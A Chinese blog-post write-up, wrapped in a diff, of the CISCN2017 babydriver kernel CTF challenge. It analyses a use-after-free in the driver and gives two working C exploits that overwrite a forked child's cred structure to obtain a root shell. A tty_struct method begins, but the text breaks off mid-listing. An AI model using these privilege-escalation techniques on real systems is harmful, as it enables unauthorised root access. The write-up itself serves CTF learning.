@@ -1,0 +1,515 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="内核pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一道内核pwn-CISCN2017-babydriver">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/index.html">
+<meta property="og:site_name" content="blingbling&#39;s blog">
+<meta property="og:description" content="内核pwn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/image-20220805171100848.png?size=600">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/image-20220805161208901.png?size=600">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/image-20220806174447004.png?size=600">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/image-20220806174723108.png?size=600">
+<meta property="article:published_time" content="2022-08-28T11:53:18.000Z">
+<meta property="article:modified_time" content="2022-08-28T12:17:41.699Z">
+<meta property="article:author" content="blingbling">
+<meta property="article:tag" content="kernel pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/image-20220805171100848.png?size=600"><title>第一道内核pwn-CISCN2017-babydriver | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2022/08/28/CISCN2017-babydriver/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":3},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"simple","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: true,
+  zoomImage: undefined,
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">blingbling's blog</div><div class="header-banner-info__subtitle">Clang鱼塘</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">第一道内核pwn-CISCN2017-babydriver</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-08-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-08-28</span></span></div></header><div class="post-body"><p>这是一道linux内核CTF的入门题，对于完全没有linux内核ko开发经验的同学，做这道题之前，建议先学一下宋宝华的《Linux设备驱动开发详解》并实践字符设备驱动的开发过程，了解read/write/ioctl/mmap这些基本内核接口的实现和原理。</p>
+<p>第一种解法：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://1.15.94.35:8090/archives/ciscn2017babydriver" >[CISCN 2017] babydriver</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://beafb1b1.github.io/kernel/ciscn_2017_babydriver_UAF/" >CISCN 2017 babydriver (UAF利用方法)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>另一种解法：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104577501" >linux kernel pwn学习之伪造tty_struct执行任意函数</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="分析"   >
+          <a href="#分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析" class="headerlink" title="分析"></a>分析</h1>
+      <p>题目附件：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver" >CISCN2017-babydriver</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>本题漏洞ko为babydriver.ko，注册了如下一些函数对用户态提供服务</p>
+<p><img   src="image-20220805171100848.png?size=600" style="width: 600px;"  alt="image-20220805171100848"></p>
+<p><code>babyopen()</code> 函数中，申请了一个0x64大小的堆，然后将堆地址和大小赋给<code>babydev_struct</code>这个结构体的成员（device_buf占8字节，device_buf_len占2字节）。<code>babydev_struct</code>是一个全局变量，未设置任何保护措施。因此，当有两个用户同时打开<code>open(&quot;/dev/babydev&quot;,2)</code>该设备节点时，后一个open操作，将覆盖<code>babydev_struct.device_buf</code>上的值，导致两个用户（不同fd）指向同一堆块。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, (_DWORD)filp, v2);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">37748928LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p><code>babyread()</code>函数逻辑简单，判断用户态传入的长度是否小于<code>babydev_struct.device_buf_len</code>，如果满足条件则将<code>babydev_struct.device_buf</code>指向的内容拷贝到用户态。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, (_DWORD)buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p><code>babywrite()</code>函数跟<code>babyread()</code>函数类似，判断条件通过后，将用户态的数据拷贝给<code>babydev_struct.device_buf</code>。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, (_DWORD)buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p><code>babyioctl()</code>只有一个分支（command），它先将<code>babydev_struct.device_buf</code>指向的堆块释放掉，然后根据用户态传入的arg参数申请<strong>任意大小</strong>堆块，并更新<code>babydev_struct</code>结构体中两个成员。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">37748928LL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p><code>babyrelease()</code>函数在<code>close(fd)</code>关闭设备节点时会被调用到，这里释放了<code>babydev_struct.device_buf</code>指向的堆块，但是并没有置空，存在<strong>UAF</strong>漏洞。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, (_DWORD)filp, v2);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>总结一下：</p>
+<ul>
+<li>两个用户（fd1, fd2）可以指向同一个内核结构体</li>
+<li>用户1（fd1）可以为该结构体申请一个任意大小的堆块然后释放该堆块</li>
+<li>用户2（fd2）获得一个垂悬指针。</li>
+</ul>
+
+        <h1 id="利用"   >
+          <a href="#利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用" class="headerlink" title="利用"></a>利用</h1>
+      
+        <h2 id="方法1-改子进程cred"   >
+          <a href="#方法1-改子进程cred" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法1-改子进程cred" class="headerlink" title="方法1 - 改子进程cred"></a>方法1 - 改子进程cred</h2>
+      <blockquote>
+<p>前置知识：fork()一个子进程时，内核会为cred分配0xa8大小的堆用于存放结构体内容。</p>
+</blockquote>
+<p>利用ioctl构造0xa8大小的堆块，然后调用close释放该堆块。紧接着fork一个子进程，就能为cred分配到刚刚释放的0xa8堆块。</p>
+<p>最后通过垂悬指针更改cred内容，获得root shell。</p>
+
+        <h3 id="在子进程中改堆中内容"   >
+          <a href="#在子进程中改堆中内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#在子进程中改堆中内容" class="headerlink" title="在子进程中改堆中内容"></a>在子进程中改堆中内容</h3>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);			<span class="comment">// 两个fd在内核中对应同一个babydev_struct结构体</span></span><br><span class="line"></span><br><span class="line">	ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);					<span class="comment">// babydev_struct.device_buf被覆盖成0xa8大小堆的地址</span></span><br><span class="line">	close(fd1);												<span class="comment">// fd2在内核中获得一个垂悬指针</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">pid_t</span> fpid; </span><br><span class="line">	fpid=fork(); 							<span class="comment">// ？fork子进程，内核会为其cred结构体申请0xa8大小的堆，在无干扰的情况下，正好分配到上述释放的堆块</span></span><br><span class="line">	<span class="keyword">if</span> (fpid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;error in fork!\n&quot;</span>); </span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (fpid == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child pid is : %d\n&quot;</span>,getpid());</span><br><span class="line">    <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd2,zeros,<span class="number">28</span>);				<span class="comment">// ？通过fd2更改cred堆块内容，将uid，gid改为0</span></span><br><span class="line">		<span class="comment">// if(getuid() == 0)&#123;</span></span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);					<span class="comment">// 起一个shell（root）</span></span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;parent pid is: %d\n&quot;</span>,getpid());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d: going to close fd2\n&quot;</span>,getpid());</span><br><span class="line">	close(fd2);					<span class="comment">//只有父进程会进入此处，子进程exit(0)时已退出</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>父进程中使用<code>wait(NULL);</code>，防止子进程还未执行完成，父进程便已提前退出。<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Ting_Yann/article/details/107545429" >wait(NULL)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>这篇文章中的 “尊老爱幼” 一词生动地解释了有无<code>wait(NULL);</code>的区别。</p>
+<p>本题需在父进程中使用该等待，否则无法在fork的子进程中稳定获得shell。</p>
+<p><img   src="image-20220805161208901.png?size=600" style="width: 600px;"  alt="image-20220805161208901"></p>
+
+        <h3 id="在父进程中改堆中内容"   >
+          <a href="#在父进程中改堆中内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#在父进程中改堆中内容" class="headerlink" title="在父进程中改堆中内容"></a>在父进程中改堆中内容</h3>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> fpid; </span><br><span class="line">    fpid=fork(); 				<span class="comment">//子进程的cred结构体正好申请到close(fd1)释放的堆，但fd2依然有指针指向该堆块</span></span><br><span class="line">    <span class="keyword">if</span> (fpid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error in fork!\n&quot;</span>); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (fpid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;waiting...&quot;</span>)			<span class="comment">// 子进程中，等待3s，等父进程更改uid和gid</span></span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);				<span class="comment">// get root shell !!!</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;			<span class="comment">// 父进程中，通过fd2更改（UAF）堆块（子进程的cred结构体）</span></span><br><span class="line">        write(fd2,zeros,<span class="number">28</span>);</span><br><span class="line">        wait(<span class="literal">NULL</span>);								<span class="comment">// 防止父进程退出导致子进程root shell被覆盖</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="方法2-tty-struct"   >
+          <a href="#方法2-tty-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法2-tty-struct" class="headerlink" title="方法2 - tty_struct"></a>方法2 - tty_struct</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/zhoucheng05_13/article/details/86510469" >Linux中的tty、pty、pts与ptmx辨析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/11c01003211b" >Linux伪终端</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>当用户打开<code>/dev/ptmx</code>设备节点时，内核会为其分配一个<code>tty_struct</code>结构体</p>
+<p>该题目版本中，tty_struct大小：<code>0x2e0</code></p>
+<p>tty_struct-&gt;tty_operations的偏移为<code>4+4+8+8=24</code></p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">  <span class="comment">// ······</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 见网页https://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty.h#L272</span></span><br></pre></td></tr></table></div></figure>
+<p>tty_operations结构体中部分成员如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">			<span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">	<span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	<span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	<span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">		      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">	<span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">	<span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">		    <span 